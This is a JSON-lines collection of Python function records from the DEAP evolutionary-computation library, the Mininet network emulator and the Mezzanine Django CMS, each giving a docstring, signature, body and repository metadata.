{"docstring": "\"\"\"Convert a binary array into an array of float where each\nfloat is composed of *nbits* and is between *min_* and *max_*\nand return the result of the decorated function.\n\n\"\"\"\n", "func_signal": "def bin2float(min_, max_, nbits):\n", "code": "def wrap(function):\n    @wraps(function)\n    def wrapped_function(individual, *args, **kargs):\n        # User must take care to make nelem an integer.\n        nelem = len(individual)//nbits\n        decoded = [0] * nelem\n        for i in xrange(nelem):\n            gene = int(\"\".join(map(str,\n                                   individual[i*nbits:i*nbits+nbits])),\n                       2)\n            div = 2**nbits - 1\n            temp = gene/div\n            decoded[i] = min_ + (temp * (max_ - min_))\n        return function(decoded, *args, **kargs)\n    return wrapped_function\nreturn wrap", "path": "deap/deap/benchmarks/binary.py", "commit_date": "2018-06-05 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "\"\"\"Replace the basic deepcopy function with a faster one.\n\nIt assumes that the elements in the :attr:`values` tuple are\nimmutable and the fitness does not contain any other object\nthan :attr:`values` and :attr:`weights`.\n\"\"\"\n", "func_signal": "def __deepcopy__(self, memo):\n", "code": "copy_ = self.__class__()\ncopy_.wvalues = self.wvalues\nreturn copy_", "path": "deap/deap/base.py", "commit_date": "2020-03-25 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "# Transform the tree expression in a callable function\n", "func_signal": "def evalSpambase(individual):\n", "code": "func = toolbox.compile(expr=individual)\n# Randomly sample 400 mails in the spam database\nspam_samp = random.sample(spam, 400)\n# Evaluate the sum of correctly identified mail as spam\nresult = sum(bool(func(*mail[:57])) is bool(mail[57]) for mail in spam_samp)\nreturn result,", "path": "deap/examples/gp/spambase.py", "commit_date": "2015-05-05 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "\"\"\"Royal Road Function R1 as presented by Melanie Mitchell in :\n\"An introduction to Genetic Algorithms\".\n\"\"\"\n", "func_signal": "def royal_road1(individual, order):\n", "code": "nelem = len(individual) // order\nmax_value = int(2**order - 1)\ntotal = 0\nfor i in xrange(nelem):\n    value = int(\"\".join(map(str, individual[i*order:i*order+order])), 2)\n    total += int(order) * int(value/max_value)\nreturn total,", "path": "deap/deap/benchmarks/binary.py", "commit_date": "2018-06-05 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "\"\"\"Try to sort the **cases** using the network, return the number of\nmisses. If **cases** is None, test all possible cases according to\nthe network dimensionality.\n\"\"\"\n", "func_signal": "def assess(self, cases=None):\n", "code": "if cases is None:\n    cases = product(range(2), repeat=self.dimension)\n\nmisses = 0\nordered = [[0]*(self.dimension-i) + [1]*i for i in range(self.dimension+1)]\nfor sequence in cases:\n    sequence = list(sequence)\n    self.sort(sequence)\n    misses += (sequence != ordered[sum(sequence)])\nreturn misses", "path": "deap/doc/code/tutorials/part_4/sortingnetwork.py", "commit_date": "2012-03-03 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "# Sort individuals so the best is first\n", "func_signal": "def update(self, population):\n", "code": "sorted_pop = sorted(population, key=attrgetter(\"fitness\"), reverse=True)\n\n# Compute the average of the mu best individuals\nz = sorted_pop[:self.mu] - self.centroid\navg = numpy.mean(z, axis=0)\n\n# Adjust variance of the distribution\nself.sigma = numpy.sqrt(numpy.sum(numpy.sum((z - avg)**2, axis=1)) / (self.mu*self.dim))\nself.centroid = self.centroid + avg", "path": "deap/examples/eda/emna.py", "commit_date": "2014-04-04 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "\"\"\"Return the Python code to build a copy of the object.\"\"\"\n", "func_signal": "def __repr__(self):\n", "code": "return \"%s.%s(%r)\" % (self.__module__, self.__class__.__name__,\n                      self.values if self.valid else tuple())", "path": "deap/deap/base.py", "commit_date": "2020-03-25 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "# Differential evolution parameters\n", "func_signal": "def main():\n", "code": "CR = 0.25\nF = 1  \nMU = 300\nNGEN = 200    \n\npop = toolbox.population(n=MU);\nhof = tools.HallOfFame(1)\nstats = tools.Statistics(lambda ind: ind.fitness.values)\nstats.register(\"avg\", numpy.mean)\nstats.register(\"std\", numpy.std)\nstats.register(\"min\", numpy.min)\nstats.register(\"max\", numpy.max)\n\nlogbook = tools.Logbook()\nlogbook.header = \"gen\", \"evals\", \"std\", \"min\", \"avg\", \"max\"\n\n# Evaluate the individuals\nfitnesses = toolbox.map(toolbox.evaluate, pop)\nfor ind, fit in zip(pop, fitnesses):\n    ind.fitness.values = fit\n\nrecord = stats.compile(pop)\nlogbook.record(gen=0, evals=len(pop), **record)\nprint(logbook.stream)\n\nfor g in range(1, NGEN):\n    for k, agent in enumerate(pop):\n        a,b,c = toolbox.select(pop)\n        y = toolbox.clone(agent)\n        index = random.randrange(NDIM)\n        for i, value in enumerate(agent):\n            if i == index or random.random() < CR:\n                y[i] = a[i] + F*(b[i]-c[i])\n        y.fitness.values = toolbox.evaluate(y)\n        if y.fitness > agent.fitness:\n            pop[k] = y\n    hof.update(pop)\n    record = stats.compile(pop)\n    logbook.record(gen=g, evals=len(pop), **record)\n    print(logbook.stream)\n\nprint(\"Best individual is \", hof[0], hof[0].fitness.values[0])", "path": "deap/examples/de/basic.py", "commit_date": "2013-06-20 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "\"\"\"Return true if each objective of *self* is not strictly worse than\nthe corresponding objective of *other* and at least one objective is\nstrictly better.\n\n:param obj: Slice indicating on which objectives the domination is\n            tested. The default value is `slice(None)`, representing\n            every objectives.\n\"\"\"\n", "func_signal": "def dominates(self, other, obj=slice(None)):\n", "code": "not_equal = False\nfor self_wvalue, other_wvalue in zip(self.wvalues[obj], other.wvalues[obj]):\n    if self_wvalue > other_wvalue:\n        not_equal = True\n    elif self_wvalue < other_wvalue:\n        return False\nreturn not_equal", "path": "deap/deap/base.py", "commit_date": "2020-03-25 00:00:00", "repo_name": "DEAP/deap", "stars": 5494, "license": "lgpl-3.0", "language": "python", "size": 11014}
{"docstring": "\"\"\"Add host.\n   name: name of host to add\n   cls: custom host class/constructor (optional)\n   params: parameters for host\n   returns: added host\"\"\"\n# Default IP and MAC addresses\n", "func_signal": "def addHost( self, name, cls=None, **params ):\n", "code": "defaults = { 'ip': ipAdd( self.nextIP,\n                          ipBaseNum=self.ipBaseNum,\n                          prefixLen=self.prefixLen ) +\n                          '/%s' % self.prefixLen }\nif self.autoSetMacs:\n    defaults[ 'mac' ] = macColonHex( self.nextIP )\nif self.autoPinCpus:\n    defaults[ 'cores' ] = self.nextCore\n    self.nextCore = ( self.nextCore + 1 ) % self.numCores\nself.nextIP += 1\ndefaults.update( params )\nif not cls:\n    cls = self.host\nh = cls( name, **defaults )\nself.hosts.append( h )\nself.nameToNode[ name ] = h\nreturn h", "path": "mininet/mininet/net.py", "commit_date": "2019-07-12 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Ping between first two hosts, useful for testing.\n   returns: ploss packet loss percentage\"\"\"\n", "func_signal": "def pingPair( self ):\n", "code": "hosts = [ self.hosts[ 0 ], self.hosts[ 1 ] ]\nreturn self.ping( hosts=hosts )", "path": "mininet/mininet/net.py", "commit_date": "2019-07-12 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Monitor a set of hosts (or all hosts by default),\n   and return their output, a line at a time.\n   hosts: (optional) set of hosts to monitor\n   timeoutms: (optional) timeout value in ms\n   returns: iterator which returns host, line\"\"\"\n", "func_signal": "def monitor( self, hosts=None, timeoutms=-1 ):\n", "code": "if hosts is None:\n    hosts = self.hosts\npoller = select.poll()\nh1 = hosts[ 0 ]  # so we can call class method fdToNode\nfor host in hosts:\n    poller.register( host.stdout )\nwhile True:\n    ready = poller.poll( timeoutms )\n    for fd, event in ready:\n        host = h1.fdToNode( fd )\n        if event & select.POLLIN:\n            line = host.readline()\n            if line is not None:\n                yield host, line\n    # Return if non-blocking\n    if not ready and timeoutms >= 0:\n        yield None, None", "path": "mininet/mininet/net.py", "commit_date": "2019-07-12 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Random placement function\n    nodename: node name\"\"\"\n", "func_signal": "def place( self, nodename ):\n", "code": "assert nodename  # please pylint\n# This may be slow with lots of servers\nreturn self.servers[ randrange( 0, len( self.servers ) ) ]", "path": "mininet/examples/cluster.py", "commit_date": "2018-10-19 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"wait for each switch to connect to a controller,\n   up to 5 seconds\n   timeout: time to wait, or None to wait indefinitely\n   delay: seconds to sleep per iteration\n   returns: True if all switches are connected\"\"\"\n", "func_signal": "def waitConnected( self, timeout=None, delay=.5 ):\n", "code": "info( '*** Waiting for switches to connect\\n' )\ntime = 0\nremaining = list( self.switches )\nwhile True:\n    for switch in tuple( remaining ):\n        if switch.connected():\n            info( '%s ' % switch )\n            remaining.remove( switch )\n    if not remaining:\n        info( '\\n' )\n        return True\n    if timeout is not None and time > timeout:\n        break\n    sleep( delay )\n    time += delay\nwarn( 'Timed out after %d seconds\\n' % time )\nfor switch in remaining:\n    if not switch.connected():\n        warn( 'Warning: %s is not connected to a controller\\n'\n              % switch.name )\n    else:\n        remaining.remove( switch )\nreturn not remaining", "path": "mininet/mininet/net.py", "commit_date": "2019-07-12 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Simple placement algorithm:\n    place nodes into evenly sized bins\"\"\"\n# Place nodes into bins\n", "func_signal": "def place( self, nodename ):\n", "code": "if nodename in self.hset:\n    server = self.servdict[ self.hind / self.hbin ]\n    self.hind += 1\nelif nodename in self.sset:\n    server = self.servdict[ self.sind / self.sbin ]\n    self.sind += 1\nelif nodename in self.cset:\n    server = self.servdict[ self.cind / self.cbin ]\n    self.cind += 1\nelse:\n    info( 'warning: unknown node', nodename )\n    server = self.servdict[ 0 ]\nreturn server", "path": "mininet/examples/cluster.py", "commit_date": "2018-10-19 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Ping between all specified hosts and return all data.\n   hosts: list of hosts\n   timeout: time to wait for a response, as string\n   returns: all ping data; see function body.\"\"\"\n# should we check if running?\n# Each value is a tuple: (src, dsd, [all ping outputs])\n", "func_signal": "def pingFull( self, hosts=None, timeout=None ):\n", "code": "all_outputs = []\nif not hosts:\n    hosts = self.hosts\n    output( '*** Ping: testing ping reachability\\n' )\nfor node in hosts:\n    output( '%s -> ' % node.name )\n    for dest in hosts:\n        if node != dest:\n            opts = ''\n            if timeout:\n                opts = '-W %s' % timeout\n            result = node.cmd( 'ping -c1 %s %s' % (opts, dest.IP()) )\n            outputs = self._parsePingFull( result )\n            sent, received, rttmin, rttavg, rttmax, rttdev = outputs\n            all_outputs.append( (node, dest, outputs) )\n            output( ( '%s ' % dest.name ) if received else 'X ' )\n    output( '\\n' )\noutput( \"*** Results: \\n\" )\nfor outputs in all_outputs:\n    src, dest, ping_outputs = outputs\n    sent, received, rttmin, rttavg, rttmax, rttdev = ping_outputs\n    output( \" %s->%s: %s/%s, \" % (src, dest, sent, received ) )\n    output( \"rtt min/avg/max/mdev %0.3f/%0.3f/%0.3f/%0.3f ms\\n\" %\n            (rttmin, rttavg, rttmax, rttdev) )\nreturn all_outputs", "path": "mininet/mininet/net.py", "commit_date": "2019-07-12 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Build mininet from a topology object\n   At the end of this function, everything should be connected\n   and up.\"\"\"\n\n# Possibly we should clean up here and/or validate\n# the topo\n", "func_signal": "def buildFromTopo( self, topo=None ):\n", "code": "if self.cleanup:\n    pass\n\ninfo( '*** Creating network\\n' )\n\nif not self.controllers and self.controller:\n    # Add a default controller\n    info( '*** Adding controller\\n' )\n    classes = self.controller\n    if not isinstance( classes, list ):\n        classes = [ classes ]\n    for i, cls in enumerate( classes ):\n        # Allow Controller objects because nobody understands partial()\n        if isinstance( cls, Controller ):\n            self.addController( cls )\n        else:\n            self.addController( 'c%d' % i, cls )\n\ninfo( '*** Adding hosts:\\n' )\nfor hostName in topo.hosts():\n    self.addHost( hostName, **topo.nodeInfo( hostName ) )\n    info( hostName + ' ' )\n\ninfo( '\\n*** Adding switches:\\n' )\nfor switchName in topo.switches():\n    # A bit ugly: add batch parameter if appropriate\n    params = topo.nodeInfo( switchName)\n    cls = params.get( 'cls', self.switch )\n    if hasattr( cls, 'batchStartup' ):\n        params.setdefault( 'batch', True )\n    self.addSwitch( switchName, **params )\n    info( switchName + ' ' )\n\ninfo( '\\n*** Adding links:\\n' )\nfor srcName, dstName, params in topo.links(\n        sort=True, withInfo=True ):\n    self.addLink( **params )\n    info( '(%s, %s) ' % ( srcName, dstName ) )\n\ninfo( '\\n' )", "path": "mininet/mininet/net.py", "commit_date": "2019-07-12 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Move remote interface from root ns to node\n    intf: string, interface\n    dstNode: destination Node\n    srcNode: source Node or None (default) for root ns\"\"\"\n", "func_signal": "def moveIntf( intf, node ):\n", "code": "intf = str( intf )\ncmd = 'ip link set %s netns %s' % ( intf, node.pid )\nresult = node.rcmd( cmd )\nif result:\n    raise Exception('error executing command %s' % cmd)\nreturn True", "path": "mininet/examples/cluster.py", "commit_date": "2018-10-19 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"servers: a list of servers to use (note: include\n   localhost or None to use local system as well)\n   user: user name for server ssh\n   placement: Placer() subclass\"\"\"\n", "func_signal": "def __init__( self, *args, **kwargs ):\n", "code": "params = { 'host': RemoteHost,\n           'switch': RemoteOVSSwitch,\n           'link': RemoteLink,\n           'precheck': True }\nparams.update( kwargs )\nservers = params.pop( 'servers', [ 'localhost' ] )\nservers = [ s if s else 'localhost' for s in servers ]\nself.servers = servers\nself.serverIP = params.pop( 'serverIP', {} )\nif not self.serverIP:\n    self.serverIP = { server: RemoteMixin.findServerIP( server )\n                      for server in self.servers }\nself.user = params.pop( 'user', findUser() )\nif params.pop( 'precheck' ):\n    self.precheck()\nself.connections = {}\nself.placement = params.pop( 'placement', SwitchBinPlacer )\n# Make sure control directory exists\nself.cdir = os.environ[ 'HOME' ] + '/.ssh/mn'\nerrRun( [ 'mkdir', '-p', self.cdir ] )\nMininet.__init__( self, *args, **params )", "path": "mininet/examples/cluster.py", "commit_date": "2018-10-19 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Spawn a process on a remote node\n    cmd: remote command to run (list)\n    **params: parameters to Popen()\n    returns: Popen() object\"\"\"\n", "func_signal": "def _popen( self, cmd, sudo=True, tt=True, **params):\n", "code": "if type( cmd ) is str:\n    cmd = cmd.split()\nif self.isRemote:\n    if sudo:\n        cmd = [ 'sudo', '-E' ] + cmd\n    if tt:\n        cmd = self.sshcmd + cmd\n    else:\n        # Hack: remove -tt\n        sshcmd = list( self.sshcmd )\n        sshcmd.remove( '-tt' )\n        cmd = sshcmd + cmd\nelse:\n    if self.user and not sudo:\n        # Drop privileges\n        cmd = [ 'sudo', '-E', '-u', self.user ] + cmd\nparams.update( preexec_fn=self._ignoreSignal )\ndebug( '_popen', cmd, '\\n' )\npopen = super( RemoteMixin, self )._popen( cmd, **params )\nreturn popen", "path": "mininet/examples/cluster.py", "commit_date": "2018-10-19 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Add switch.\n   name: name of switch to add\n   cls: custom switch class/constructor (optional)\n   returns: added switch\n   side effect: increments listenPort ivar .\"\"\"\n", "func_signal": "def addSwitch( self, name, cls=None, **params ):\n", "code": "defaults = { 'listenPort': self.listenPort,\n             'inNamespace': self.inNamespace }\ndefaults.update( params )\nif not cls:\n    cls = self.switch\nsw = cls( name, **defaults )\nif not self.inNamespace and self.listenPort:\n    self.listenPort += 1\nself.switches.append( sw )\nself.nameToNode[ name ] = sw\nreturn sw", "path": "mininet/mininet/net.py", "commit_date": "2019-07-12 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Delete link(s) between node1 and node2\n   index: index of link to delete if multiple links (0)\n   allLinks: ignore index and delete all such links (False)\n   returns: deleted link(s)\"\"\"\n", "func_signal": "def delLinkBetween( self, node1, node2, index=0, allLinks=False ):\n", "code": "links = self.linksBetween( node1, node2 )\nif not allLinks:\n    links = [ links[ index ] ]\nfor link in links:\n    self.delLink( link )\nreturn links", "path": "mininet/mininet/net.py", "commit_date": "2019-07-12 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Initialize a RemoteLink\n   see Link() for parameters\"\"\"\n# Create links on remote node\n", "func_signal": "def __init__( self, node1, node2, **kwargs ):\n", "code": "self.node1 = node1\nself.node2 = node2\nself.tunnel = None\nkwargs.setdefault( 'params1', {} )\nkwargs.setdefault( 'params2', {} )\nself.cmd = None  # satisfy pylint\nLink.__init__( self, node1, node2, **kwargs )", "path": "mininet/examples/cluster.py", "commit_date": "2018-10-19 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Check that a given value is within a tolerance of expected\ntolerance_frac: less-than-1.0 value; 0.8 would yield 20% tolerance.\n\"\"\"\n", "func_signal": "def assertWithinTolerance( self, measured, expected, tolerance_frac, msg ):\n", "code": "upperBound = ( float( expected ) + ( 1 - tolerance_frac ) *\n               float( expected ) )\nlowerBound = float( expected ) * tolerance_frac\ninfo = ( 'measured value is out of bounds\\n'\n         'expected value: %s\\n'\n         'measured value: %s\\n'\n         'failure tolerance: %s\\n'\n         'upper bound: %s\\n'\n         'lower bound: %s\\n'\n         % ( expected, measured, tolerance_frac,\n             upperBound, lowerBound ) )\nmsg += info\n\nself.assertGreaterEqual( float( measured ), lowerBound, msg=msg )\nself.assertLessEqual( float( measured ), upperBound, msg=msg )", "path": "mininet/mininet/test/test_hifi.py", "commit_date": "2014-12-08 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Ping between first two hosts, useful for testing.\n   returns: ploss packet loss percentage\"\"\"\n", "func_signal": "def pingPairFull( self ):\n", "code": "hosts = [ self.hosts[ 0 ], self.hosts[ 1 ] ]\nreturn self.pingFull( hosts=hosts )", "path": "mininet/mininet/net.py", "commit_date": "2019-07-12 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Ping between all specified hosts.\n   hosts: list of hosts\n   timeout: time to wait for a response, as string\n   returns: ploss packet loss percentage\"\"\"\n# should we check if running?\n", "func_signal": "def ping( self, hosts=None, timeout=None ):\n", "code": "packets = 0\nlost = 0\nploss = None\nif not hosts:\n    hosts = self.hosts\n    output( '*** Ping: testing ping reachability\\n' )\nfor node in hosts:\n    output( '%s -> ' % node.name )\n    for dest in hosts:\n        if node != dest:\n            opts = ''\n            if timeout:\n                opts = '-W %s' % timeout\n            if dest.intfs:\n                result = node.cmd( 'ping -c1 %s %s' %\n                                   (opts, dest.IP()) )\n                sent, received = self._parsePing( result )\n            else:\n                sent, received = 0, 0\n            packets += sent\n            if received > sent:\n                error( '*** Error: received too many packets' )\n                error( '%s' % result )\n                node.cmdPrint( 'route' )\n                exit( 1 )\n            lost += sent - received\n            output( ( '%s ' % dest.name ) if received else 'X ' )\n    output( '\\n' )\nif packets > 0:\n    ploss = 100.0 * lost / packets\n    received = packets - lost\n    output( \"*** Results: %i%% dropped (%d/%d received)\\n\" %\n            ( ploss, received, packets ) )\nelse:\n    ploss = 0\n    output( \"*** Warning: No packets sent\\n\" )\nreturn ploss", "path": "mininet/mininet/net.py", "commit_date": "2019-07-12 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Parse iperf output and return bandwidth.\n   iperfOutput: string\n   returns: result string\"\"\"\n", "func_signal": "def _parseIperf( iperfOutput ):\n", "code": "r = r'([\\d\\.]+ \\w+/sec)'\nm = re.findall( r, iperfOutput )\nif m:\n    return m[-1]\nelse:\n    # was: raise Exception(...)\n    error( 'could not parse iperf output: ' + iperfOutput )\n    return ''", "path": "mininet/mininet/net.py", "commit_date": "2019-07-12 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"rcmd: run a command on underlying server\n   in root namespace\n   args: string or list of strings\n   returns: stdout and stderr\"\"\"\n", "func_signal": "def rcmd( self, *cmd, **opts):\n", "code": "popen = self.rpopen( *cmd, **opts )\n# info( 'RCMD: POPEN:', popen, '\\n' )\n# These loops are tricky to get right.\n# Once the process exits, we can read\n# EOF twice if necessary.\nresult = ''\nwhile True:\n    poll = popen.poll()\n    result += popen.stdout.read()\n    if poll is not None:\n        break\nreturn result", "path": "mininet/examples/cluster.py", "commit_date": "2018-10-19 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"Add controller.\n   controller: Controller class\"\"\"\n# Get controller class\n", "func_signal": "def addController( self, name='c0', controller=None, **params ):\n", "code": "if not controller:\n    controller = self.controller\n# Construct new controller if one is not given\nif isinstance( name, Controller ):\n    controller_new = name\n    # Pylint thinks controller is a str()\n    # pylint: disable=maybe-no-member\n    name = controller_new.name\n    # pylint: enable=maybe-no-member\nelse:\n    controller_new = controller( name, **params )\n# Add new controller to net\nif controller_new:  # allow controller-less setups\n    self.controllers.append( controller_new )\n    self.nameToNode[ name ] = controller_new\nreturn controller_new", "path": "mininet/mininet/net.py", "commit_date": "2019-07-12 00:00:00", "repo_name": "mininet/mininet", "stars": 5103, "license": "bsd-3-clause", "language": "python", "size": 3374}
{"docstring": "\"\"\"\nHide from the admin menu unless explicitly set in ``ADMIN_MENU_ORDER``.\n\"\"\"\n", "func_signal": "def has_module_permission(self, request):\n", "code": "for (name, items) in settings.ADMIN_MENU_ORDER:\n    if \"blog.BlogCategory\" in items:\n        return True\nreturn False", "path": "mezzanine/mezzanine/blog/admin.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nOverride ``DisplayableManager.published`` to exclude\npages with ``login_required`` set to ``True``. if the\nuser is unauthenticated and the setting\n``PAGES_PUBLISHED_INCLUDE_LOGIN_REQUIRED`` is ``False``.\n\nThe extra ``include_login_required`` arg allows callers to\noverride the ``PAGES_PUBLISHED_INCLUDE_LOGIN_REQUIRED``\nbehaviour in special cases where they want to deal with the\n``login_required`` field manually, such as the case in\n``PageMiddleware``.\n\"\"\"\n", "func_signal": "def published(self, for_user=None, include_login_required=False):\n", "code": "published = super(PageManager, self).published(for_user=for_user)\nunauthenticated = for_user and not is_authenticated(for_user)\nif (\n    unauthenticated\n    and not include_login_required\n    and not settings.PAGES_PUBLISHED_INCLUDE_LOGIN_REQUIRED\n):\n    published = published.exclude(login_required=True)\nreturn published", "path": "mezzanine/mezzanine/pages/managers.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "# We choose a setting that will definitely exist:\n", "func_signal": "def test_allowed(self):\n", "code": "ts = TemplateSettings(settings, [\"INSTALLED_APPS\"])\nself.assertEqual(ts.INSTALLED_APPS, settings.INSTALLED_APPS)\nself.assertEqual(ts[\"INSTALLED_APPS\"], settings.INSTALLED_APPS)", "path": "mezzanine/tests/test_conf.py", "commit_date": "2020-09-09 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nHack the `project_template` dir into an actual project to test against.\n\"\"\"\n", "func_signal": "def pytest_configure():\n", "code": "from mezzanine.utils.importing import path_for_import\n\ntemplate_path = Path(path_for_import(\"mezzanine\")) / \"project_template\"\nshutil.copytree(str(template_path), str(TMP_PATH))\nproj_path = TMP_PATH / \"project_name\"\nlocal_settings = (proj_path / \"local_settings.py.template\").read_text()\n(proj_path / \"test_settings.py\").write_text(TEST_SETTINGS + local_settings)\n\n# Setup the environment for Django\nsys.path.insert(0, str(TMP_PATH))\nos.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", \"project_name.test_settings\")\ndjango.setup()", "path": "mezzanine/tests/conftest.py", "commit_date": "2020-09-09 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nTest the editable setting caching behavior.\n\"\"\"\n\n# Ensure usage with no current request does not break caching\n", "func_signal": "def test_editable_caching(self):\n", "code": "from mezzanine.core.request import _thread_local\n\ntry:\n    del _thread_local.request\nexcept AttributeError:\n    pass\n\nsetting = Setting.objects.create(name=\"SITE_TITLE\", value=\"Mezzanine\")\noriginal_site_title = settings.SITE_TITLE\nsetting.value = \"Foobar\"\nsetting.save()\nnew_site_title = settings.SITE_TITLE\nsetting.delete()\nself.assertNotEqual(original_site_title, new_site_title)", "path": "mezzanine/tests/test_conf.py", "commit_date": "2020-09-09 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nReturns the Mezzanine profile model, defined in\n``settings.ACCOUNTS_PROFILE_MODEL``, or ``None`` if no profile\nmodel is configured.\n\"\"\"\n\n", "func_signal": "def get_profile_model():\n", "code": "if not getattr(settings, \"ACCOUNTS_PROFILE_MODEL\", None):\n    raise ProfileNotConfigured\n\ntry:\n    return apps.get_model(settings.ACCOUNTS_PROFILE_MODEL)\nexcept ValueError:\n    raise ImproperlyConfigured(\n        \"ACCOUNTS_PROFILE_MODEL must be of \" \"the form 'app_label.model_name'\"\n    )\nexcept LookupError:\n    raise ImproperlyConfigured(\n        \"ACCOUNTS_PROFILE_MODEL refers to \"\n        \"model '%s' that has not been installed\" % settings.ACCOUNTS_PROFILE_MODEL\n    )", "path": "mezzanine/mezzanine/accounts/__init__.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nReturns the name of the first field on the profile model that\npoints to the ``auth.User`` model.\n\"\"\"\n", "func_signal": "def get_profile_user_fieldname(profile_model=None, user_model=None):\n", "code": "Profile = profile_model or get_profile_model()\nUser = user_model or get_user_model()\nfor field in Profile._meta.get_fields():\n    if get_related_model(field) == User:\n        return field.name\nraise ImproperlyConfigured(\n    \"Value for ACCOUNTS_PROFILE_MODEL does not \"\n    \"contain a ForeignKey field for auth.User: %s\" % Profile.__name__\n)", "path": "mezzanine/mezzanine/accounts/__init__.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nTest that conflicting settings raise a warning and use the settings.py\nvalue instead of the value from the database.\n\"\"\"\n\n", "func_signal": "def test_conflicting_setting(self):\n", "code": "settings.clear_cache()\n\nregister_setting(name=\"CONFLICTING_SETTING\", editable=True, default=1)\nSetting.objects.create(name=\"CONFLICTING_SETTING\", value=2)\nsettings.CONFLICTING_SETTING = 3\n\nwith warnings.catch_warnings():\n    warning_re = (\n        \"These settings are defined in both \" r\"settings\\.py and the database\"\n    )\n    warnings.filterwarnings(\"error\", warning_re, UserWarning)\n\n    with self.assertRaises(UserWarning):\n        settings.CONFLICTING_SETTING\n\nself.assertEqual(settings.CONFLICTING_SETTING, 3)\n\ndel settings.CONFLICTING_SETTING", "path": "mezzanine/tests/test_conf.py", "commit_date": "2020-09-09 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nUse Mezzanine's project template by default. The method of\npicking the default directory is copied from Django's\nTemplateCommand.\n\"\"\"\n", "func_signal": "def handle_template(self, template, subdir):\n", "code": "if template is None:\n    return str(os.path.join(mezzanine.__path__[0], subdir))\nreturn super(Command, self).handle_template(template, subdir)", "path": "mezzanine/mezzanine/bin/management/commands/mezzanine_project.py", "commit_date": "2020-09-09 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
